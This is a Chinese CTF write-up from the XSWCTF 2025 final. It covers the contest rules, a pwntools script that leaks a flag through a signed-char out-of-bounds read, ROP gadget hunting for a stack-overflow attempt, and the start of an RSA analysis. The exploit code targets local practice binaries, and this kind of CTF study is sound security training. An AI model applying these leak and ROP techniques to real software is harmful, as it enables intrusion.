# [个人队伍] XSWCTF2025的WriteUp

3人赛

# XSWCTF 2025 决赛

**29**支队伍已报名

开始时间

2025年12月6日上午9点00分

结束时间

2025年12月6日下午5点00分



你已经以队伍 菜鸟的个人队 成员身份成功报名

请耐心等待审核结果

本次比赛为**中山大学、华南师范大学、暨南大学**联合举办，由**暨大 Xp0int 团队、华师 Sloth 团队、中大 W4terDr0p 团队**联合命题

旨在培养同学们对网络安全竞赛的兴趣，寻找对网络安全技术感兴趣的小伙伴们

为 Xp0int、Sloth 、W4terDr0p 战队纳新挖掘优秀人才，注入新生力量

决赛，Show Time！

## 比赛时间

北京时间 **2025 年 12 月 6 日早 9:00** 开始，至 **2025 年 12 月 6 日晚 17:00** 结束。

## 赛制规则

1. 此次比赛题目的flag格式为：**^XSWCTF\{[^}]+\}$**，请提交包含 `XSWCTF{}` 的完整 `flag` 来进行得分。
2. 采用动态分值，每道题目的分值会随着通过人数的增加而减少，减少的速度与题目预设难度相关。
3. 最终排名根据总分确定，在得分相同的情况下，越早达到这一分值的队伍排名越高。
4. 前三支成功解题的队伍将会获得基于当前题目分值的加分奖励，比例分别为 5%，3% 和 1%。
5. 本次比赛中，同一队伍最多开启 **三个** 容器实例。

## AI 协助分级规则（试行）

为进一步规范 AI 工具在本次比赛中的使用，兼顾公平性与题目挑战性，组委会引入 AI 协助分级规则，具体如下：

| 等级 | 允许范围                                   | 禁止行为                                                     |
| ---- | ------------------------------------------ | ------------------------------------------------------------ |
| A0   | 全程禁止使用任何 AI 工具                   | 以任何方式借助 AI 参与分析、编写或调试解题相关内容           |
| A1   | 允许 AI 用于资料查询、概念解释、一般性咨询 | 使用具备 Agent 能力的 AI 工具进行托管式、自动化或半自动化解题 |
| A2   | 允许不受限制地使用各类 AI 工具             | 无额外禁止行为（仍须遵守本次比赛的其它全部规则）             |

选手须在 Writeup 中说明所使用的 AI 工具及其主要用途（可简要描述），并同时遵守以下要求：

- 解题关键思路必须完整呈现，由选手以清晰、简明的语言自主撰写；
- **禁止**直接复制粘贴 AI 的原始输出内容或其截图作为解题过程展示；
- **必须提供获取到 flag 的即时性截图**，包括必要的交互过程、脚本运行输出等关键信息；
- 关键解题流程与核心脚本须由选手独立编写，可在此基础上使用 AI 优化文字表述、编写注释等。

如队伍被认定违反上述 AI 协助分级规则，裁判组有权视情节轻重**取消其部分或全部比赛成绩**，本规则的最终解释权归裁判组所有。

## 诚信比赛承诺书

各位同学，你们好！继续比赛我们将认为你已知悉并同意下列事项：

1. 选手应该只针对特定题目进行合理测试，不应该攻击比赛平台（即本网站）。做题过程中可以合理进行自动化尝试，可以利用题目漏洞解题，但不可以利用比赛平台漏洞、恶意干扰比赛正常运行。

2. 本比赛为三人组队线上赛，所有题目都可以独立完成，即使看起来似乎不可能。比赛完全结束前，无论出于何种理由和目的，以下行为均属于作弊行为：

   - 和他人讨论题目相关信息；
   - 向他人提供题目相关信息；
   - 使用他人提供或泄露的题目相关信息；

   > **他人：** 包括但不限于同学、室友等，但主办方，裁判组及出题人除外。 **题目相关信息：** 包括但不限于队伍 token、题目附件、题目链接、解题提示、解题思路、题目答案等。

3. 我们给予参赛选手极高的信任，但裁判组有权通过其他证据及风控系统数据判定选手的作弊行为，有权取消作弊选手的参赛资格并予以公示。

4. 如果参赛选手不确定某个行为是否属于上述作弊行为的例外情况，可以向主办方，裁判组及出题人咨询，不可以直接尝试。

5. 如果参赛选手发现比赛作弊现象，应该拒绝参与并告知裁判组。

**`Hack for fun not for profit.`**

## 比赛规则

1. 本次比赛为三人组队赛。
2. 参赛选手如有任何违规行为，将被取消比赛成绩和参赛资格，并加入长期禁赛黑名单。
3. 禁止不同参赛选手合作，或者共享 `flag` 字符串、及题目提示等任何比赛相关信息。
4. 禁止攻击比赛平台，如果发现平台漏洞，请务必向我们报告。如根据风控数据发现此类行为，将取消参赛成绩。
5. 禁止在比赛中妨碍其他选手解题，例如对题目环境进行破坏从而导致他人无法正常作答。
6. 禁止往比赛平台发送大量流量，**没有任何题目需要使用扫描器**。
7. 禁止对提交的 `flag` 进行爆破，且提交有速率限制。如根据风控数据发现此类行为，可能对账户进行短期或取消参赛成绩。
8. 比赛主办方有权修改包括赛题、规则等一切事项，比赛解释权归主办方所有。



GZ::CTF

Copyright © 2022-2025 [@GZTimeWalker](https://github.com/GZTimeWalker), All Rights Reserved.

Powered by [S1uM4i CTF Team](https://www.s1um4i.com/)



# Day1

## Pwn

### encoder(probie)

#### 解题过程

**查看源码**

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+3h] [rbp-11Dh]
  int i; // [rsp+4h] [rbp-11Ch]
  FILE *stream; // [rsp+8h] [rbp-118h]
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  stream = fopen("flag", "r");
  if ( stream )
  {
    fgets(flag, 64, stream);
    fclose(stream);
  }
  while ( 1 )
  {
    do
      printf("> ");
    while ( !fgets(s, 256, stdin) );
    for ( i = 0; i <= 255 && s[i]; ++i )
    {
      v3 = s[i];
      if ( (i & 1) != 0 )
        putchar(upper[v3]);
      else
        putchar(lower[v3]);
    }
    putchar(10);
  }
}
```

**分析：**

- 这里没有栈溢出漏洞可以利用
- 这里主要的逻辑就是`putchar(upper[v3])`和`putchar(lower[v3])`
- 我们可以读取`upper`和`lower`在全局栈上的`[0, 255]`的数据

**AI：**

- **问**

  ```c
  for ( i = 0; i <= 255 && s[i]; ++i )
      {
        v3 = s[i];
        if ( (i & 1) != 0 )
          putchar(upper[v3]);
        else
          putchar(lower[v3]);
      }
  ```

  这里存在什么漏洞，怎么利用

- **答(简化)**

  ```shell
  一、代码漏洞核心分析
  这段 C 代码存在内存越界访问（包括s的越界读、upper/lower的负下标越界读）和未定义行为，具体拆解如下：
  1. 问题 1：char类型的符号扩展导致数组负下标访问（最严重）
  代码中v3 = s[i];，而char在绝大多数编译器（如 GCC）中默认是有符号字符（signed char），取值范围为-128 ~ 127。
  若s[i]的 ASCII 值为0x80 ~ 0xFF（即十进制 128~255），signed char会将其解释为-128 ~ -1；
  此时upper[v3]/lower[v3]等价于访问数组的负索引（如upper[-1]），即访问upper/lower数组起始地址之前的内存区域，属于严重的越界读漏洞。
  2. 问题 2：s[i]的潜在越界读
  循环条件i <= 255 && s[i]中，i的上限是 255，但未检查s的实际长度：
  若s是一个长度不足 256 且无\0终止符的数组（如char s[256]; memset(s, 1, 256);），s[i]会访问s数组外的内存（越界读），可能读取到进程内存中的随机数据。
  3. 未定义行为的风险
  负下标访问：若访问的内存地址不在进程地址空间内，会触发段错误（SIGSEGV） 导致程序崩溃；
  敏感数据泄露：若访问的是进程合法内存（如栈上的返回地址、全局变量、密码等），攻击者可通过输出的字符还原内存数据；
  配合其他漏洞：若结合缓冲区溢出等写漏洞，可构造恶意数据实现代码执行。
  二、漏洞利用方式（仅用于安全研究，禁止恶意利用）
  假设代码中s是用户可控的输入（如命令行参数、网络输入），攻击者可通过以下方式利用：
  场景 1：信息泄露（核心利用方式）
  构造恶意输入s：将s的部分字节设置为0x80 ~ 0xFF（如0xFF对应signed char的-1），触发upper/lower的负下标访问；
  读取输出字符：upper[v3]会输出upper数组起始地址前|v3|字节的内存数据（如栈上的返回地址、全局敏感变量）；
  还原内存数据：通过输出的字符映射 ASCII 值，逆向推导内存中的原始数据（如栈地址、密码、密钥等），为后续 ROP 攻击、代码执行铺垫。
  示例：
  c
  运行
  // 假设程序接收用户输入s
  char s[256];
  fgets(s, sizeof(s), stdin); // 用户输入可控
  for (int i = 0; i <= 255 && s[i]; ++i) {
      char v3 = s[i]; // 有符号char
      if (i & 1) putchar(upper[v3]); // 若v3=-1，访问upper[-1]
      else putchar(lower[v3]);
  }
  攻击者输入\xFF（即0xFF），程序会输出upper数组前 1 字节的内存数据，攻击者可通过该字符推断内存内容。
  场景 2：拒绝服务（DoS）
  构造s的字节为0x80 ~ 0xFF，且负下标指向进程无效内存地址（如内核空间、未映射内存），触发段错误导致程序崩溃，中断服务。
  场景 3：配合其他漏洞执行代码
  若程序同时存在缓冲区溢出漏洞，攻击者可：
  通过信息泄露获取栈地址 / 函数地址；
  构造溢出数据覆盖返回地址；
  结合 ROP 链执行恶意代码。
  三、漏洞修复方案
  针对核心问题，需从类型安全和边界检查两方面修复：
  1. 强制无符号字符类型（解决负下标核心问题）
  将v3改为unsigned char，确保下标范围为0 ~ 255：
  c
  运行
  for (int i = 0; i <= 255 && s[i]; ++i) {
      unsigned char v3 = (unsigned char)s[i]; // 无符号，范围0-255
      if (i & 1) putchar(upper[v3]); // 下标合法
      else putchar(lower[v3]);
  }
  2. 增加下标合法性检查
  即使使用无符号类型，仍建议检查下标是否在upper/lower数组的合法范围内：
  c
  运行
  #define ARRAY_SIZE 256
  char upper[ARRAY_SIZE], lower[ARRAY_SIZE];
  
  for (int i = 0; i <= 255 && s[i]; ++i) {
      unsigned char v3 = (unsigned char)s[i];
      if (v3 >= ARRAY_SIZE) { // 检查下标合法性
          fprintf(stderr, "Invalid index: %u\n", v3);
          continue;
      }
      if (i & 1) putchar(upper[v3]);
      else putchar(lower[v3]);
  }
  3. 限制s的访问范围
  避免s[i]越界读，明确s的长度并强制终止符：
  c
  运行
  // 假设s的最大长度为256
  char s[256] = {0}; // 初始化全0
  fgets(s, sizeof(s), stdin);
  // 确保s以\0结尾（截断超长输入）
  s[sizeof(s)-1] = '\0';
  四、总结
  该代码的核心漏洞是有符号 char 导致的数组负下标越界读，可被利用于信息泄露、拒绝服务，甚至配合其他漏洞实现代码执行。修复的关键是确保数组下标为无符号类型，并增加边界检查，避免访问非法内存区域。
  注意：以上分析仅用于安全研究和代码加固，禁止利用漏洞从事恶意攻击行为，否则需承担相应法律责任。
  ```

我们先点击这两个数组看一看

**数据搜集**

```nasm
.data:0000000000004020                 public flag
.data:0000000000004020 ; char flag[]
.data:0000000000004020 flag            db 'flag{nonono}',0     ; DATA XREF: main+93↑o
.data:000000000000402D                 db    0
.data:000000000000402E                 db    0
.data:000000000000402F                 db    0
.data:0000000000004030                 db    0
.data:0000000000004031                 db    0
.data:0000000000004032                 db    0
.data:0000000000004033                 db    0
.data:0000000000004034                 db    0
.data:0000000000004035                 db    0
.data:0000000000004036                 db    0
.data:0000000000004037                 db    0
.data:0000000000004038                 db    0
.data:0000000000004039                 db    0
.data:000000000000403A                 db    0
.data:000000000000403B                 db    0
.data:000000000000403C                 db    0
.data:000000000000403D                 db    0
.data:000000000000403E                 db    0
.data:000000000000403F                 db    0
.data:0000000000004040                 db    0
.data:0000000000004041                 db    0
.data:0000000000004042                 db    0
.data:0000000000004043                 db    0
.data:0000000000004044                 db    0
.data:0000000000004045                 db    0
.data:0000000000004046                 db    0
.data:0000000000004047                 db    0
.data:0000000000004048                 db    0
.data:0000000000004049                 db    0
.data:000000000000404A                 db    0
.data:000000000000404B                 db    0
.data:000000000000404C                 db    0
.data:000000000000404D                 db    0
.data:000000000000404E                 db    0
.data:000000000000404F                 db    0
.data:0000000000004050                 db    0
.data:0000000000004051                 db    0
.data:0000000000004052                 db    0
.data:0000000000004053                 db    0
.data:0000000000004054                 db    0
.data:0000000000004055                 db    0
.data:0000000000004056                 db    0
.data:0000000000004057                 db    0
.data:0000000000004058                 db    0
.data:0000000000004059                 db    0
.data:000000000000405A                 db    0
.data:000000000000405B                 db    0
.data:000000000000405C                 db    0
.data:000000000000405D                 db    0
.data:000000000000405E                 db    0
.data:000000000000405F                 db    0
.data:0000000000004060                 public upper
.data:0000000000004060 ; char upper[128]
.data:0000000000004060 upper           db 9 dup('?'), 9, 0Ah, 0Bh, 0Ch, 0Dh, 12h dup('?'), ' '
.data:0000000000004060                                         ; DATA XREF: main+11D↑o
.data:0000000000004081                 db '!', '"', '#', '$', '%', '&', 27h, '(', ')', '*', '+'
.data:000000000000408C                 db ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6'
.data:0000000000004097                 db '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A'
.data:00000000000040A2                 db 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L'
.data:00000000000040AD                 db 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W'
.data:00000000000040B8                 db 'X', 'Y', 'Z', '[', '\', ']', '^', '_', '`', 'A', 'B'
.data:00000000000040C3                 db 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M'
.data:00000000000040CE                 db 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X'
.data:00000000000040D9                 db 'Y', 'Z', '{', '|', '}', '~', 0
.data:00000000000040E0                 public lower
.data:00000000000040E0 ; char lower[127]
.data:00000000000040E0 lower           db 9 dup('?'), 9, 0Ah, 0Bh, 0Ch, 0Dh, 12h dup('?'), ' '
.data:00000000000040E0                                         ; DATA XREF: main+13D↑o
.data:0000000000004101                 db '!', '"', '#', '$', '%', '&', 27h, '(', ')', '*', '+'
.data:000000000000410C                 db ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6'
.data:0000000000004117                 db '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'a'
.data:0000000000004122                 db 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l'
.data:000000000000412D                 db 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w'
.data:0000000000004138                 db 'x', 'y', 'z', '[', '\', ']', '^', '_', '`', 'a', 'b'
.data:0000000000004143                 db 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm'
.data:000000000000414E                 db 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x'
.data:0000000000004159                 db 'y', 'z', '{', '|', '}', '~'
```

**分析：**

- 看到`char upper[128]`和`char lower[127]`是远小于我们可读的`255`的
- 我们可以用最靠近`flag`的`upper`数组来向上读取我们需要的`flag`

**编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 12854)

for i in range(256):
    r.sendlineafter(b"> ", b"|" + bytes([i]))
    try:
        print(r.recvuntil(b"\n").strip().decode().replace('|', ''), end='')
    except UnicodeDecodeError:
        continue
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 12854
[x] Opening connection to 127.0.0.1 on port 12854: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 12854: Done
??????????????????????????!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{}~                         9f~         K6]W                  XSWCTF{d5543950-57dc-4fc5-be37-8a79bec88433}                   [*] Closed connection to 127.0.0.1 port 12854

进程已结束，退出代码为 0
```

**得到：XSWCTF{d5543950-57dc-4fc5-be37-8a79bec88433}**  



### a_strange_rop(probie)(尝试)

#### 解题过程

**信息搜集**

```shell
probie@Probie:/mnt/d/Downloads$ checksec --file=pwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   54 Symbols        No    0      1pwn
```

**分析：**

- Canary
- No PIE
- NX

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  if ( (unsigned int)game() == 1 )
    win();
  return 0;
}

__int64 game()
{
  unsigned int v0; // eax
  int i; // [rsp+0h] [rbp-70h]
  int j; // [rsp+4h] [rbp-6Ch]
  unsigned int v4; // [rsp+8h] [rbp-68h]
  unsigned int v5; // [rsp+Ch] [rbp-64h]
  _QWORD v6[12]; // [rsp+10h] [rbp-60h] BYREF

  v6[11] = __readfsqword(0x28u);
  id = 0;
  puts(&byte_40202B);
  v0 = time(0LL);
  srand(v0);
  for ( i = 0; i <= 9; ++i )
  {
    v4 = rand() % 20;
    v5 = rand() % 20;
    printf(format, (unsigned int)id, v4, v5);
    answer[id++] = (int)(v4 + v5);
  }
  puts(&byte_402058);
  while ( t <= 10 )
  {
    printf(&byte_402077);
    __isoc99_scanf("%d", &id);
    if ( id > 9 )
    {
      puts(asc_402088);
      exit(114514);
    }
    printf(&byte_4020A8);
    __isoc99_scanf("%lld", &v6[id]);
    ++t;
  }
  puts(&byte_4020B8);
  for ( j = 0; j <= 9; ++j )
  {
    if ( answer[j] != v6[j] )
    {
      printf(&byte_4020D8, (unsigned int)j);
      return 0LL;
    }
  }
  return 1LL;
}

int win()
{
  puts("good!");
  return system("ababalabalabalawuwuwuuwyyyyy");
}
```

**数据收集**

```nasm
.text:00000000004012D6                 lea     rax, command    ; "ababalabalabalawuwuwuuwyyyyy"
.text:00000000004012DD                 mov     rdi, rax        ; command
.text:00000000004012E0                 call    _system
```

```nasm
data:0000000000404078 a               db '/bin/sh',0
```

**分析：**

- `while ( t <= 10 )`和`for ( j = 0; j <= 9; ++j )`循环条件冲突了，循环`10`次但只检测`9`组数据
- `9`组数据全部正确我们才能进入`win`函数
- 但是`win`函数的`system`的`command`不是`/bin/sh`而是`ababalabalabalawuwuwuuwyyyyy`
- 我们需要想办法让`command`从`ababalabalabalawuwuwuuwyyyyy`指向`/bin/sh`
- 我们可以用`fmt`，修改`command`的地址为`/bin/sh`的地址，但这里没有格式化字符串漏洞
- 还可以用数组`v6`覆盖栈上的`command`，但是`v6`是局部变量

最终行不通



### guessing game(probie)(尝试)

#### 解题过程

**信息搜集**

```shell
probie@Probie:/mnt/d/Downloads$ checksec --file=main
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0      2main
```

**分析：**

- Canary
- No PIE
- NX

**查看源码**

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned __int64 v3; // rax
  char i; // [rsp+7h] [rbp-39h]
  __int64 v6; // [rsp+8h] [rbp-38h] BYREF
  unsigned __int64 v7; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+18h] [rbp-28h]
  unsigned __int64 v9; // [rsp+20h] [rbp-20h]
  char v10[10]; // [rsp+2Eh] [rbp-12h] BYREF
  unsigned __int64 v11; // [rsp+38h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v8 = v11 >> 8;
  puts("Welcome to the guessing game!");
  printf("Enter a max number: ");
  __isoc99_scanf("%lu", &v6);
  if ( v6 == -1 )
    v3 = v8;
  else
    v3 = v8 % (v6 + 1);
  v9 = v3;
  for ( i = sub_4011F6(v6 + 1); ; --i )
  {
    if ( !i )
    {
      printf("Better luck next time!");
      return 0LL;
    }
    printf("Enter a guess: ");
    __isoc99_scanf("%lu", &v7);
    if ( v9 == v7 )
      break;
    if ( v9 >= v7 )
      printf("Too low!\n");
    else
      printf("Too high!\n");
  }
  puts("Wow! You got it!");
  printf("Enter your name: ");
  do
    v8 = getchar();
  while ( v8 != 10 && (_DWORD)v8 != -1 );
  gets(v10);
  printf("Thanks, %s!\n", v10);
  return 0LL;
}
```

**分析：**

- 这里`gets(v10)`存在栈溢出漏洞
- 问题是这道题目的`canary`是全变化的(在`__check***`函数前下断点，步入找到`00`结尾的canary，发现它的值每次都是全变化)，所以我们无法爆破canary
- 而且`gets`只会被调用一次，没有`canary`我们无法进行任何栈溢出操作

我们先来泄露`canary`试试

**编写尝试脚本**

```python
from pwn import *

r = remote("127.0.0.1", 10141)

r.sendlineafter(b"Enter a max number: ", b'0')
r.sendlineafter(b"Enter a guess: ", b'0')

payload = cyclic(10) + b'\xff' + b'\n'
r.sendafter(b"Enter your name: ", payload)

r.interactive()
```

**运行尝试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 10141
[x] Opening connection to 127.0.0.1 on port 10141: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 10141: Done
[*] Switching to interactive mode
Thanks, aaaabaaaca!
*** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 10141

进程已结束，退出代码为 0
```

会触发`canary`的栈溢出检测

**分析：**

- 想到我们可以用`gets`直接覆盖到`stack smashing detected`的储存地址，然它返回读取的`flag`或执行我们的`rop`链
- 但是这里它没有将`flag`读取到内存中去，所有我们尝试一下执行`rop`链

**数据搜集**

```shell
ropper -f main --search "pop rdi; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: main
0x000000000040124d: pop rdi; ret; 
```

```shell
ropper -f main --search "ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret;

[INFO] File: main
0x000000000040101a: ret; 
```

```shell
strings -a -t x main | grep "/bin/sh"
```

```shell
   3060 /bin/sh
```

```shell
objdump -d main | grep "system"
```

```shell

```

**分析：**

- 可以看到我们这里没有`system@plt`
- 我们可以尝试用`exec`，也就是`syscall`神圣术

**数据收集**

```shell
ropper -f main --search "pop"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: main
0x000000000040124f: pop rax; ret; 
0x00000000004011dd: pop rbp; ret; 
0x000000000040124d: pop rdi; ret; 
0x0000000000401253: pop rdx; ret; 
0x0000000000401251: pop rsi; ret;
```

```shell
ropper -f main --search "syscall"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

[INFO] File: main
0x0000000000401255: syscall;
```

觉得可能性不大

最终放弃了



## Crypto

### Loss N-4(probie)

#### 解题过程

**查看题目**

```python
from Crypto.Util.number import *
from gmpy2 import *

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip().encode()

m = bytes_to_long(flag)
p = getPrime(512)
q = next_prime(p)
n = p * q
e = 0x10001 # 65537
d = inverse(e, (p-1) * (q-1))
c = pow(m, e, n)
print(f"c = {c}")
print(f"d = {d}")
```

**AI：**

- **问**

  逆模运算

  ```python
  d = inverse(e, (p-1) * (q-1))
  ```

  可逆吗？

- **答(简化)**

  ```shell
  要判断 d = inverse(e, (p-1)*(q-1)) 是否可逆（即模逆元是否存在），核心结论是：当且仅当 e 与 (p-1)*(q-1) 互质（最大公约数 gcd (e, (p-1)(q-1)) = 1）时，模逆元存在。
  一、背景补充（RSA 场景）
  这个公式是 RSA 加密算法中计算私钥指数 d 的核心步骤：
  p 和 q 是两个大质数；
  φ(n) = (p-1)(q-1) 是欧拉函数（n = p*q）；
  e 是公钥指数（通常选 65537）；
  d 是 e 模 φ(n) 的乘法逆元，满足 (e*d) mod φ(n) = 1。
  二、模逆元存在的数学条件
  对于模运算 a ≡ b⁻¹ mod m（即求 b 模 m 的逆元），逆元存在的充要条件是：gcd(b, m) = 1（b 和 m 互质）。
  对应到你的问题中：
  底数：e
  模数：m = (p-1)*(q-1)
  因此，inverse(e, (p-1)(q-1)) 可逆 ⇨ gcd(e, (p-1)(q-1)) = 1。
  三、具体分析
  可逆的情况（常见）实际 RSA 中，e 通常选 65537（2¹⁶+1，一个大质数），而 (p-1)(q-1) 是两个大质数减 1 的乘积：
  只要 65537 不整除 (p-1) 且不整除 (q-1)，则 gcd(65537, (p-1)(q-1)) = 1，逆元必然存在；
  工程上生成 p/q 时，会刻意避开 p-1 或 q-1 被 e 整除的情况，确保互质。
  不可逆的情况（罕见）若 e 与 (p-1)(q-1) 不互质（即 gcd(e, (p-1)(q-1)) = k > 1），则逆元不存在：
  例：p=7, q=11 → φ(n)=6*10=60；若选 e=4，则 gcd(4,60)=4≠1，此时 4 模 60 无逆元；
  例：若 e=3，p=7（p-1=6 能被 3 整除），则 gcd(3,60)=3≠1，同样无逆元。
  四、验证方法（代码示例）
  可以通过计算最大公约数验证，以 Python 为例：
  python
  运行
  import math
  
  # 示例参数
  p = 61    # 质数
  q = 53    # 质数
  phi_n = (p-1) * (q-1)  # 60*52=3120
  e = 65537              # 常见公钥指数
  
  # 验证是否互质
  gcd_val = math.gcd(e, phi_n)
  if gcd_val == 1:
      # 计算逆元（Python 3.8+ 支持 pow(a, -1, mod)）
      d = pow(e, -1, phi_n)
      print(f"逆元存在：d = {d}")
      print(f"验证：(e*d) mod phi_n = {(e*d) % phi_n}")  # 输出 1
  else:
      print(f"逆元不存在，gcd(e, phi_n) = {gcd_val}")
  五、总结
  条件	逆元是否存在	实际场景
  gcd(e, (p-1)(q-1)) = 1	是	RSA 标准用法（必满足）
  gcd(e, (p-1)(q-1)) > 1	否	错误选参（需重新选 e/p/q）
  简单来说：只要 e 和 (p-1)(q-1) 互质，就可逆；否则不可逆。在 RSA 实现中，会强制保证这一条件，因此逆元必然存在。
  ```

- **问**

  已知多组`c`和`d`且`e`已知，但是`p`、`q`、`n`、`phi_n`和`m`未知，比如

  ```python
  m = pow(c1, d1, n)
  m = pow(c2, d2, n)
  m = pow(c3, d3, n)
  ```

  可以联立求解吗，或者说像共模攻击那样求出明文m？

- **答(简化)**

  ```shell
  问题核心分析
  你的问题本质是：已知多组(c_i, d_i)、固定明文m和公钥模数n（未知），且满足m ≡ c_i^d_i mod n（i=1,2,...k），能否像 RSA 共模攻击一样求解m/n/ 私钥参数。
  结论先给出：在满足一定条件下可以求解，但核心逻辑和 RSA 共模攻击（已知c1=pow(m,e1,n)、c2=pow(m,e2,n)，且gcd(e1,e2)=1求m）不同，需要利用模幂等式的代数性质和数论工具（如扩展欧几里得、中国剩余定理、因式分解）。
  一、基础前提与符号定义
  先明确 RSA 的核心关系（即使参数未知，底层数学规则不变）：
  对每组(c_i, d_i)：c_i ≡ m^e_i mod n（加密），m ≡ c_i^d_i mod n（解密），因此联立得：m ≡ (m^e_i)^d_i mod n → m^(e_i d_i - 1) ≡ 1 mod n。
  n = p*q（大素数），phi(n) = (p-1)(q-1)，且满足e_i d_i ≡ 1 mod phi(n)（RSA 私钥生成规则）。
  你的已知条件：
  已知：多组(c_i, d_i)、m是固定值（未知待求）；
  未知：n、p、q、phi(n)、e_i、m。
  二、可求解的场景与方法
  场景 1：至少有两组(c1,d1)、(c2,d2)，且能构造m的显式等式
  从核心等式m = c1^d1 mod n和m = c2^d2 mod n，可得：c1^d1 - c2^d2 ≡ 0 mod n → n | (c1^d1 - c2^d2)。
  这是关键！n是c1^d1 - c2^d2的一个因子，步骤如下：
  计算K = |c1^d1 - c2^d2|；
  对K做因式分解（试除法、Pollard's Rho 算法等），得到K的所有素因子 / 因子组合；
  对每个候选因子n_candidate，验证：
  验证 1：pow(c1, d1, n_candidate) == pow(c2, d2, n_candidate)（确保两组都满足模n_candidate的一致性）；
  验证 2：若有更多组(c3,d3)，需满足pow(c3, d3, n_candidate) == 验证1的结果；
  验证 3：（可选）n_candidate应为两个大素数的乘积（符合 RSA 模数特征）；
  验证通过的n_candidate即为n，pow(c1, d1, n)即为明文m。
  场景 2：多组 d_i 满足 gcd (d1,d2)=1（类共模攻击逻辑）
  若能利用m ≡ c1^d1 mod n和m ≡ c2^d2 mod n，结合扩展欧几里得算法构造m：
  由扩展欧几里得，找到整数x,y使得d1*x + d2*y = 1；
  则m = m^(d1*x + d2*y) = (m^d1)^x * (m^d2)^y mod n；
  但注意：m^d1 ≡ c1^(d1*e1) ≡ c1^1 mod n（因为e1*d1≡1 mod phi(n)），即m^d1 ≡ c1 mod n，同理m^d2 ≡ c2 mod n；
  因此m ≡ c1^x * c2^y mod n。
  但这个方法的前提是已知n —— 因此通常需要先通过场景 1 的方法找到n，再用此方法快速验证 / 计算m。
  三、关键限制与注意事项
  K 的因式分解难度：若n是大模数（如 2048 位），则K = |c1^d1 - c2^d2|会是极大数，因式分解难度等同于破解 RSA，此时无法在有限时间内求解；
  d_i 的有效性：必须确保d_i是对应c_i的合法 RSA 私钥（即满足e_i d_i ≡1 mod phi(n)），若d_i是随机值则上述方法失效；
  多组验证：仅两组(c_i,d_i)可能得到多个候选n，需更多组数据缩小范围；
  模运算溢出：直接计算c1^d1（不模 n）在d_i极大时会非常慢，可优化为：
  先估算n的大致范围（如通过c_i的位数，RSA 中c_i < n）；
  用模幂的性质近似计算c1^d1 - c2^d2的因子。
  四、总结
  核心思路：利用n | (c1^d1 - c2^d2)找到n的候选值，再验证所有组的一致性得到n和m；
  可行性：小模数（教学场景）下完全可行，大模数下受限于因式分解能力；
  对比共模攻击：共模攻击是已知c1=m^e1 mod n、c2=m^e2 mod n，利用e1,e2互质构造m；而你的问题是已知c_i和d_i，先找n再求m，核心是因子分解而非直接构造。
  如果你的实际场景是小模数（如教学 / CTF 题目），上述方法可以高效求解；如果是工业级大模数，现有算力下无法破解。
  ```

**分析：**

- 这道题的突破口在于`q = next_prime(p)`，即`q`是`p`的下一个素数
- 因为`e * d ≡ 1 (mod Φ(n))`，所以`phi_n = (e * d - 1) / k`，其中`k > 0 且 k ∈ Z`
- 又因为`e = 0x10001 = 65537`，又所以`k < e = 65537`
- `65537`是一个很小的数值所以我们可以直接遍历所有`phi_n`的可能情况
